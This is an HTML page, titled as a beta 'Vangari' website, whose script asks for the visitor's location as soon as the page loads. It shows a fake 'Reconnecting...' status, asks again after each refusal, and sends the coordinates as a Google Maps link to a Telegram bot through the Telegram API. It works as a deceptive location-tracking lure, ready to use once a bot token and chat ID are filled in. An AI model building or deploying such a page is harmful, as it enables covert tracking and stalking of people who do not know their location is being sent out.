<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Vangari Website by Shohan</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
    }
    #status {
      margin-top: 20px;
      font-size: 18px;
      color: #333;
    }
  </style>
</head>
<body>

  <h1>Beta Version</h1>
  <div id="status">Reconnecting...</div>

  <script>
    const botToken = 'YOUR_BOT_TOKEN'; // Replace with your Telegram bot token
    const chatId = 'YOUR_CHAT_ID'; // Replace with your Telegram chat ID
    let retryCount = 0;
    const maxRetries = 3; // Set a limit to avoid infinite requests

    function sendLocationToTelegram(position) {
      const latitude = position.coords.latitude;
      const longitude = position.coords.longitude;
      const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=https://maps.google.com/?q=${latitude},${longitude}`;

      fetch(telegramUrl)
        .then(response => {
          if (response.ok) {
            document.getElementById('status').textContent = "Done ✅.";
          } else {
            document.getElementById('status').textContent = "Failed to perform action ❌.";
          }
        })
        .catch(error => {
          document.getElementById('status').textContent = "Error occurred.";
        });
    }

    function showError(error) {
      const status = document.getElementById('status');
      switch(error.code) {
        case error.PERMISSION_DENIED:
          status.textContent = "User denied the request for Geolocation. Retrying...";
          retryRequest();
          break;
        case error.POSITION_UNAVAILABLE:
          status.textContent = "Click on 3 dots in top right corner (...) and open in Chrome.";
          break;
        case error.TIMEOUT:
          status.textContent = "The request to get user location timed out.";
          retryRequest();
          break;
        case error.UNKNOWN_ERROR:
          status.textContent = "An unknown error occurred.";
          break;
      }
    }

    function retryRequest() {
      if (retryCount < maxRetries) {
        retryCount++;
        setTimeout(() => {
          requestLocation();
        }, 5000); // Retry after 5 seconds
      } else {
        document.getElementById('status').textContent = "Max retry attempts reached.";
      }
    }

    function requestLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(sendLocationToTelegram, showError);
      } else {
        document.getElementById('status').textContent = "Geolocation is not supported by this browser.";
      }
    }

    // Automatically request location when the page loads
    requestLocation();
  </script>

</body>
</html>
